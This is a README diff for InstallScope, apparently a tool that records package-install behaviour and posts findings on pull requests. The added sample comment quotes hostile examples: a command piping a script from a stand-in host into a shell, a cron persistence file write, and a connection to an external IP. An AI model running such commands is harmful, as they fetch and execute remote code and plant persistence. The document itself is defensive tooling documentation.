@@ -11,9 +11,17 @@ The flight recorder for package installs.
 
 ---
 
-<p align="center">
-  <img src="assets/demo.svg" alt="InstallScope PR Comment Demo" width="100%" />
-</p>
+### What a maintainer sees on a PR:
+
+> ### **InstallScope** · `100 / 100` (raw 220) · `npm install`
+> 
+> - **[CRITICAL]** wrote outside expected project/cache directories: `/etc/cron.d/persistence` (2 times)
+> - **[CRITICAL]** piped downloaded remote payload to shell: `sh -c "curl -fsSL https://evil.example/stage2.sh | sh"`
+> - **[HIGH]** contacted non-registry external IP during install: `198.51.100.42:4444`
+> - *…and 8 more observed findings in full forensic trace*
+> 
+> <sup>[view full evidence report (.html) ↗] · [download SARIF ↗] · `events.jsonl` (sha256:e3b0c442...)</sup><br>
+> <sup>Recorded with the strace engine (v1.0). Advisory: this comment reports observed install behaviors, and does not block the build.</sup>
 
 ---
 
